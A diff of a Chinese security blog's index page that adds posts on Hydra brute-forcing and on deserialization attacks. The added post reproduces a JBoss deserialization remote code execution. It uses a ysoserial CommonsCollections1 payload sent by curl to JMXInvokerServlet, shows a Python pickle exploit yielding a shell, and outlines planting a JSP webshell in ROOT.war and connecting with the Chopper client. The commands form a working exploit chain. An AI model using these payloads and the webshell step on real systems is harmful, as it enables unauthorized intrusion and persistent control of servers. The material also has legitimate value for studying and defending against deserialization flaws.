@@ -194,8 +194,8 @@
           
           
             
-              <a class="post-title-link" href="/2016/01/13/NESSUS使用记录/" itemprop="url">
-                NESSUS使用记录
+              <a class="post-title-link" href="/2016/01/13/基于Web漏洞测试平台-1/" itemprop="url">
+                爆破工具hydra使用记录
               </a>
             
           
@@ -216,8 +216,8 @@
           
             <span class="post-comments-count">
               &nbsp; | &nbsp;
-              <a href="/2016/01/13/NESSUS使用记录/#comments" itemprop="discussionUrl">
-                <span class="post-comments-count ds-thread-count" data-thread-key="2016/01/13/NESSUS使用记录/" itemprop="commentsCount"></span>
+              <a href="/2016/01/13/基于Web漏洞测试平台-1/#comments" itemprop="discussionUrl">
+                <span class="post-comments-count ds-thread-count" data-thread-key="2016/01/13/基于Web漏洞测试平台-1/" itemprop="commentsCount"></span>
               </a>
             </span>
           
@@ -232,7 +232,7 @@
 
       
         
-          <span itemprop="articleBody"></span>
+          <span itemprop="articleBody"><h2 id="邮箱爆破">邮箱爆破</h2></span>
         
       
     </div>
@@ -404,9 +404,9 @@ rundll32.exe javascript:<span class="string">"\..\mshtml,RunHTMLApplication "</s
           <span itemprop="articleBody"><blockquote>
 <p>数据和操作指令保存在一起不加区分，从而容易被误解</p>
 </blockquote>
-<p>1.序列化和反序列化简介<br>2.python演示反序列化利用姿势<br>3.java演示利用姿势<br>4.检测poc编写</p>
-<p>个人理解的序列化就是把数据，这个数据可以是广义上的对象（万物皆对象），按照一定的规则输出纯文本。反序列化的过程就是将序列化的纯文本的按照一定的规则解析，还原场景的过程。当然一套序列化和反序列话的规则应该是对应的，例如python中的cpickle模块，java中的ObjectOutputStream，ObjectInputStream类，php中的serialize()函数。为了跨平台，跨语言可以将数据序列化成xml，json的格式进行传输。<br>在序列化和反序列化的过程，如果被别有用心的人利用，构造恶意序列化文本发送给程序，程序解析了这个文本之后便可以执行攻击者构造的操作指令，其危害不言而喻。以个人比较熟悉的python为例：</p>
-<pre><code>import cPickle 
+<p>1.序列化和反序列化简介<br>2.python演示反序列化利用姿势<br>3.java演示利用姿势<br>4.相关EXP</p>
+<h2 id="序列化和反序列化简介">序列化和反序列化简介</h2><p>个人理解的序列化就是把数据，这个数据可以是广义上的对象（万物皆对象），按照一定的规则输出纯文本。反序列化的过程就是将序列化的纯文本的按照一定的规则解析，还原场景的过程。当然一套序列化和反序列话的规则应该是对应的，例如python中的cpickle模块，java中的ObjectOutputStream，ObjectInputStream类，php中的serialize()函数。为了跨平台，跨语言可以将数据序列化成xml，json的格式进行传输。<br>在序列化和反序列化的过程，如果被别有用心的人利用，构造恶意序列化文本发送给程序，程序解析了这个文本之后便可以执行攻击者构造的操作指令，其危害不言而喻。</p>
+<h2 id="python演示反序列化利用姿势">python演示反序列化利用姿势</h2><pre><code>import cPickle 
 
 data = <span class="string">"test"</span> <span class="instruction">
 packed </span>=<span class="function"> cPickle.dumps(</span>data<span class="function">)</span> <span class="comment"># 序列化 </span>
@@ -436,8 +436,28 @@ data =<span class="function"> cPickle.loads(</span>packed<span class="function">
 C:\Documents <span class="keyword">and</span> Settings\testuser&gt;exit
 Use exit() <span class="keyword">or</span> Ctrl-Z plus Return to exit 
 &gt;&gt;&gt;
-</code></pre><p>GET SHELL！</p>
-<p><a href="http://drops.wooyun.org/papers/66" target="_blank" rel="external">http://drops.wooyun.org/papers/66</a><br><a href="http://drops.wooyun.org/tips/3909" target="_blank" rel="external">http://drops.wooyun.org/tips/3909</a><br><a href="http://drops.wooyun.org/papers/10801" target="_blank" rel="external">http://drops.wooyun.org/papers/10801</a></p>
+</code></pre><h2 id="java演示利用姿势">java演示利用姿势</h2><p>java反序列化的过程可能造成的安全问题和python的过程类似，关于近来比较火热的weblogic，jboss等web容器的反序列化相关漏洞，老外放出了构造payload的脚本ysoserial，这里以jboss为例，做一下重现。</p>
+<p>在VPS上安装jboss</p>
+<pre><code>apt-get install java-<span class="number">1.7</span><span class="number">.0</span>-openjdk-devel -y 
+wget -O jboss-<span class="number">4.2</span><span class="number">.3</span>.zip http:<span class="comment">//sourceforge.net/projects/jboss/files/JBoss/JBoss-4.2.3.GA/jboss-4.2.3.GA-jdk6.zip/download </span>
+unzip jboss-<span class="number">4.2</span><span class="number">.3</span>.zip
+cd /home/jboss/bin
+./run.sh -b <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>                   <span class="preprocessor">#运行在<span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:<span class="number">8080</span>上</span>
+</code></pre><p>下载构造脚本，构造payload</p>
+<pre><code>wget https:<span class="comment">//github.com/frohoff/ysoserial/releases/download/v0.0.2/ysoserial-0.0.2-all.jar </span>
+java -jar ysoserial-<span class="number">0.0</span>.<span class="number">2</span>-all<span class="class">.jar</span> CommonsCollections1 <span class="string">'mkdir /home/jj'</span> &gt; /home/payload
+curl --<span class="tag">header</span> <span class="string">'Content-Type: application/x-java-serialized-object; class=org.jboss.invocation.MarshalledValue'</span> --data-binary <span class="string">'@/home/payload'</span> http:<span class="comment">//0.0.0.0:8080/invoker/JMXInvokerServlet</span>
+</code></pre><p>列出home目录</p>
+<pre><code><span class="title">ls</span> /home                 <span class="comment">#发现执行了 mkdir /home/jj</span>
+</code></pre><h2 id="相关EXP">相关EXP</h2><pre><code><span class="preprocessor">#使用ls回显命令查找jboss根目录</span>
+ls ../server/<span class="keyword">default</span>/deploy/jboss-web.deployer/ROOT.war
+
+<span class="preprocessor">#上传</span>
+ls ../server/<span class="keyword">default</span>/deploy/jboss-web.deployer/ROOT.war/test.jsp
+
+<span class="preprocessor">#菜刀连接</span>
+http:<span class="comment">//ip:port/test.jsp</span>
+</code></pre><h2 id="参考">参考</h2><p><a href="http://zone.wooyun.org/content/23847" target="_blank" rel="external">关于java unserialize rce 一些细节和jboss rce 实践</a><br><a href="http://drops.wooyun.org/papers/66" target="_blank" rel="external">Python Pickle反序列化带来的安全问题</a><br><a href="http://drops.wooyun.org/tips/3909" target="_blank" rel="external">PHP Session 序列化及反序列化处理器设置使用不当带来的安全隐患</a><br><a href="http://drops.wooyun.org/papers/10801" target="_blank" rel="external">从反序列化到命令执行 - Java 中的 POP 执行链</a></p>
 </span>
         
       
@@ -1308,7 +1328,7 @@ msf&gt; db_status <span class="preprocessor">#查看数据库连接状态</span>
 
           <div class="site-state-item site-state-tags">
             <a href="/tags">
-              <span class="site-state-item-count">38</span>
+              <span class="site-state-item-count">39</span>
               <span class="site-state-item-name">标签</span>
               </a>
           </div>
